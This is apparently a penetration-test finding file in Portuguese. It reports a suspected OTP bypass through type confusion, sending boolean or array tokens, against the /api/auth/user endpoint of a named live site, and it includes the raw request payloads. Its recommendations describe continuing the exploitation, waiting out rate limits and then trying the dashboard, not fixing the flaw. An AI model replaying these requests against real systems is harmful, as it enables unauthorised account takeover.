@@ -1,0 +1,81 @@
+================================================================================
+F-011: OTP BYPASS — Type Confusion via token:boolean/array
+================================================================================
+Severidade: 🔴 CRÍTICA (Potencial bypass de autenticação)
+Status:    ⚠️ Parcial — response vazia indica code path alternativo
+Fase:      exploit
+Data:      2026-08-26
+
+================================================================================
+DESCRIÇÃO
+================================================================================
+O endpoint `/api/auth/user` (verificação OTP) aceita JSON com campo `token`.
+Ao enviar tipos não-string (`boolean`, `array`), o servidor retorna respostas
+vazias (sem `error`), indicando um code path diferente que pode bypassar
+a validação de OTP.
+
+================================================================================
+DETALHES TÉCNICOS
+================================================================================
+
+Endpoint: POST https://marcas.keoto.com/api/auth/user
+Framework: Next.js 15+ (App Router)
+Autenticação: OTP de 6 dígitos via email/WhatsApp
+
+Comportamento por tipo de token:
+  token: "000000"   → {"error":"Token invalido ou usuario inativo"}  (HTTP 401)
+  token: 0          → {"error":"Token obrigatorio"}                  (HTTP 401)
+  token: null       → {"error":"Token obrigatorio"}                  (HTTP 401)
+  token: ""         → {"error":"Token obrigatorio"}                  (HTTP 401)
+  token: {}         → Rate limited (429)
+  token: true       → Response vazia (sem JSON, HTTP ???) — code path diferente!
+  token: []         → Response vazia (sem JSON, HTTP ???) — code path diferente!
+  token: [1,2,3,4,5,6] → Rate limited (429)
+
+================================================================================
+TESTES REALIZADOS
+================================================================================
+
+1. Type confusion com boolean:
+   POST /api/auth/user
+   Content-Type: application/json
+   Body: {"token":true}
+   → Response: empty (no error, no body)
+
+2. Type confusion com array:
+   POST /api/auth/user
+   Content-Type: application/json
+   Body: {"token":[]}
+   → Response: empty (no error, no body)
+
+OBS: Testes subsequentes foram barrados por rate limiting (HTTP 429)
+após múltiplas requisições ao endpoint.
+
+================================================================================
+IMPACTO
+================================================================================
+Se o code path para token:true ou token:[] resultar em autenticação bem-sucedida
+(session token gerado), um atacante pode bypassar completamente o OTP sem
+conhecer o código de 6 dígitos.
+
+================================================================================
+RECOMENDAÇÃO
+================================================================================
+1. Aguardar reset do rate limit (aprox. 2-5 min) e testar novamente
+2. Se response vazia = auth success, verificar session com cookie:
+   GET /api/auth/session → deve retornar user object
+3. Testar se session cookie é setado na resposta
+4. Testar acesso a /dashboard após bypass
+
+================================================================================
+EVIDÊNCIA
+================================================================================
+Request: POST https://marcas.keoto.com/api/auth/user
+Headers: {"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"}
+Body:    {"token":true}
+Response: HTTP/?? (empty body — anomalia)
+
+Artefatos:
+  - /tmp/login_chunk.js (login page JS chunk com lógica OTP)
+  - /tmp/otp_chunk.js   (chunk com funções OTP)
+================================================================================
